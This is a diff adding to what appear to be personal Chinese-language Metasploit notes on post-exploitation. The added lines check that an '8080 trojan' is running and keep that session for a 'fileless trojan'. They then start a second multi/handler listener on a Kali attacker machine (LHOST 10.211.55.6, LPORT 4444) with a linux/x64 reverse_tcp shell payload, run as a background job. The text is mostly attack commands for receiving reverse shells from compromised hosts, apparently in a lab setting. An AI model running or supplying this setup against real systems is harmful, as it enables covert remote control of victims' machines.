@@ -60,6 +60,39 @@ msf6 exploit(multi/handler) > sessions -i 1
 启动
 msf6 exploit(multi/handler) > sessions会话
 
+查看当前进程ID
+netstat -lntpu | grep 8080
+查看8080这个木马是否已执行成功
+
+如ifconfig无法执行时，加上绝对路径
+which ifconfig
+查绝对路径
+/sbin/ifconfig即可
+
+这个8080的session保留，用来创建无文件的木马
+
+###攻击机，重启终端，搞4444端口
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfconsole
+
+msf6 > use exploit/multi/handler     
+msf6 exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp 
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > set LPORT 4444
+使用幽灵4444木马
+msf6 exploit(multi/handler) > exploit -j
+后台监听，jobs查看
+
+
+#
+##
+###
+
+
+
+
+
+
 
 
 
